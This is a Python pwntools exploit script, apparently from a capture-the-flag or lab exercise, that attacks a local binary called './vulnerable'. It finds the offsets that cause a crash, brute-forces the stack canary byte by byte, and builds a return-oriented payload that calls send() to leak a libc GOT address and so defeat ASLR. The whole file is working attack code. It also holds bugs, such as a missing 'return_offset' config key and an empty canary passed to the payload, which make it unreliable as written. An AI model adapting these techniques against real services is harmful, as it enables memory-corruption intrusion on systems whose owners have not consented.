from pwn import *
import socket
import time
import json
import os

BINARY_FILE = './vulnerable'
CONFIG_FILE = 'config.json'

def find_available_port():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', 0))
        port = s.getsockname()[1]
    return port

def send_payload(payload):
    has_crashed = False
    BINARY_FILE = './vulnerable'
    port = find_available_port()

    try:
        process_instance = process([BINARY_FILE, str(port)])
        time.sleep(0.1)

        conn = remote('localhost', port)

        conn.recvuntil('Select menu > ')
        
        conn.sendline('1')
        conn.recvuntil('Message: ')

        conn.send(payload)

        conn.recvuntil('Select menu > ')
        conn.sendline('3')

        response = conn.recvall(timeout=2)

        if b'Exiting...' not in response:
            has_crashed = True  # Binary crashed or incorrect response

    except EOFError:
        log.warn(f"Process crashed with the input: {payload}")
        has_crashed = True

    except Exception as e:
        log.warn(f"An error occurred: {str(e)}")
        has_crashed = True

    finally:
        conn.close()
        process_instance.close()
        return has_crashed

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    return {'canary_offset': None, 'canary_value': ''}

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f)

def get_canary_offset(config):
    if config['canary_offset'] is not None:
        log.info(f"Using stored canary offset: {config['canary_offset']}")
        return config['canary_offset']

    offset = 0
    has_crashed = False
    while has_crashed == False:
        offset += 1
        payload = 'A' * offset
        has_crashed = send_payload(payload)
        log.info(f"Test offset?: {offset}")
        log.info(f"Binary has crashed?: {has_crashed}")

    config['canary_offset'] = offset - 1
    save_config(config)
    
    return config['canary_offset']

def get_return_offset(config):
    if config['return_offset'] is not None:
        log.info(f"Using stored return offset: {config['return_offset']}")
        return config['return_offset']

    offset = 0
    
    initial_payload = 'A' * config['canary_offset']

    has_crashed = False
    while has_crashed == False:
        offset += 1
        payload = initial_payload + 'B' * offset
        has_crashed = send_payload(payload)
        log.info(f"Test offset?: {offset}")
        log.info(f"Binary has crashed?: {has_crashed}")

    config['return_offset'] = offset - 1
    save_config(config)
    
    return config['return_offset']

def bruteforce_canary(config, canary_offset):
    """
    Brute-force the stack canary value byte by byte.
    Handles null bytes correctly.
    """
    log.info("Starting canary brute-forcing")
    canary_length = 8  # Assuming an 8-byte canary (x86_64)
    
    # Load the partial canary from the config, or start with an empty one
    canary = bytes.fromhex(config['canary_value']) if config['canary_value'] else b''

    while len(canary) < canary_length:
        found_byte = False
        for byte in range(256):  # Brute force each byte (0 to 255)
            # Construct payload using raw binary data (including null bytes)
            payload = b'A' * canary_offset + canary + bytes([byte])
            log.info(f"Trying byte {hex(byte)} for canary at offset {len(canary)}")
            
            has_crashed = send_payload(payload)
            if not has_crashed:
                # If the service didn't crash, we assume the byte is correct
                canary += bytes([byte])
                log.info(f"Canary byte found: {hex(byte)}")
                
                # Update the config with the partially found canary and save it
                config['canary_value'] = canary.hex()
                save_config(config)
                
                found_byte = True
                break  # Go to the next byte

        if not found_byte:
            log.error("Failed to find the next byte of the canary. Something went wrong.")
            break

    return canary


def make_infoleak_payload(canary, canary_offset, return_address_offset, send_address, socket_fd, address_to_leak):
    """
    The goal is to use the payload to:

    1. Overwrite the return address on the stack to redirect execution to a function (send).
    2. Set up the arguments for send (or another function that transmits data) to leak memory content.
    3. Leak the content of a specific memory address (address_to_leak) back to the attacker.
    """
    payload = b'A' * canary_offset
    payload += canary
    payload += b'B' * return_address_offset
    payload += p64(send_address)
    payload += b'XXXX'
    payload += p64(socket_fd)
    payload += p64(address_to_leak)
    payload += p64(8)  # Length of leak
    payload += p64(0)  # Unused argument
    return payload

def infoleak(infoleak_payload):
    """
    The goal is to use the payload to:

    1. Overwrite the return address on the stack to redirect execution to a function (send).
    2. Set up the arguments for send (or another function that transmits data) to leak memory content.
    3. Leak the content of a specific memory address (address_to_leak) back to the attacker.
    """
    BINARY_FILE = './vulnerable'
    port = find_available_port()

    process_instance = process([BINARY_FILE, str(port)])
    time.sleep(0.1)

    conn = remote('localhost', port)

    conn.recvuntil('Select menu > ')
    
    conn.sendline('1')
    conn.recvuntil('Message: ')

    conn.send(infoleak_payload)

    conn.recvuntil('Select menu > ')
    conn.sendline('3')

    leaked_data = conn.recv(4)

    conn.close()
    process_instance.close()

    return u32(leaked_data.ljust(4, b'\x00'))

# Load the config from file
config = load_config()

# Get the canary offset, either from the config or by calculating it
canary_offset = get_canary_offset(config)

# Brute-force the canary byte by byte, resuming from the last successful byte if needed
#canary = bruteforce_canary(config, canary_offset)

#log.info(f"Final canary: {canary.hex()}")


return_address_offset = get_return_offset(config)

binary = ELF(BINARY_FILE)
send_address = binary.symbols['send']
address_to_leak = binary.symbols['got.__libc_start_main']

log.info(f"send_address: {send_address}")
log.info(f"address_to_leak: {address_to_leak}")

infoleak_payload = make_infoleak_payload(b'', canary_offset, return_address_offset, send_address, 4, address_to_leak)

log.info(f"infoleak_payload: {infoleak_payload}")

leaked_data = infoleak(infoleak_payload)

log.info(f"leaked_data: {leaked_data}")
